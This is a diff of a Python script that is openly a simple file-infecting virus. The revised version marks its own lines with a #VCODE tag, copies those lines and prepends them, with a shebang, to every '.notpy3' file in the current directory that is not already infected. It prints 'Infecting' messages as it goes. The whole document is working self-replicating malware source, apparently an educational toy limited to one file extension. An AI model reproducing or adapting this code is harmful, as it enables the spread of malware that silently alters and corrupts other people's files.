@@ -1,36 +1,39 @@
 #!/usr/bin/python3
-#VCODE
-import os
-import sys
-
-# Get list of all files.
-dirs = os.listdir()
-
-# Read ourself.
-with open(sys.argv[0], "r") as fp:
-    virus = fp.read()
-
-# Iterate through each file/dir.
-for entry in dirs:
-    # Do nothing if extension isn't ".notpy3".
-    if(os.path.splitext(entry)[1] != ".notpy3"):
-        continue
-
-    # Read victim.
-    with open(entry, "r") as fp:
-        victim = fp.read()
-    
-    # Also do nothing if the victim is already infected.
-    if(victim.find("#VCODE") != -1):
-        print("Script {} is already infected...".format(entry))
-        continue
-
-    # Announce that we're infected the script.
-    print("Infecting {}!".format(entry))
-
-    # Prepend virus to victim.
-    infected = virus + victim
-
-    # Write infected victim back.
-    with open(entry, "w") as fp:
-        fp.write(infected)
+import os                                                               #VCODE
+import sys                                                              #VCODE
+                                                                        #VCODE
+# Get list of all files.                                                #VCODE
+dirs = os.listdir()                                                     #VCODE
+                                                                        #VCODE
+# Read ourself.                                                         #VCODE
+virus = ""                                                              #VCODE
+with open(sys.argv[0], "r") as fp:                                      #VCODE
+    # Read a line, if it contains #VCODE add it to the virus.           #VCODE
+    for line in fp:                                                     #VCODE
+        if(line.find("#VCODE") != -1):                                  #VCODE
+            virus += line                                               #VCODE
+                                                                        #VCODE
+# Iterate through each file/dir.                                        #VCODE
+for entry in dirs:                                                      #VCODE
+    # Do nothing if extension isn't ".notpy3".                          #VCODE
+    if(os.path.splitext(entry)[1] != ".notpy3"):                        #VCODE
+        continue                                                        #VCODE
+                                                                        #VCODE
+    # Read victim.                                                      #VCODE
+    with open(entry, "r") as fp:                                        #VCODE
+        victim = fp.read()                                              #VCODE
+                                                                        #VCODE
+    # Also do nothing if the victim is already infected.                #VCODE
+    if(victim.find("#VCODE") != -1):                                    #VCODE
+        print("Script {} is already infected...".format(entry))         #VCODE
+        continue                                                        #VCODE
+                                                                        #VCODE
+    # Announce that we're infected the script.                          #VCODE
+    print("Infecting {}!".format(entry))                                #VCODE
+                                                                        #VCODE
+    # Prepend virus to victim.                                          #VCODE
+    infected = "#!/usr/bin/python3\n" + virus + victim                  #VCODE
+                                                                        #VCODE
+    # Write infected victim back.                                       #VCODE
+    with open(entry, "w") as fp:                                        #VCODE
+        fp.write(infected)                                              #VCODE
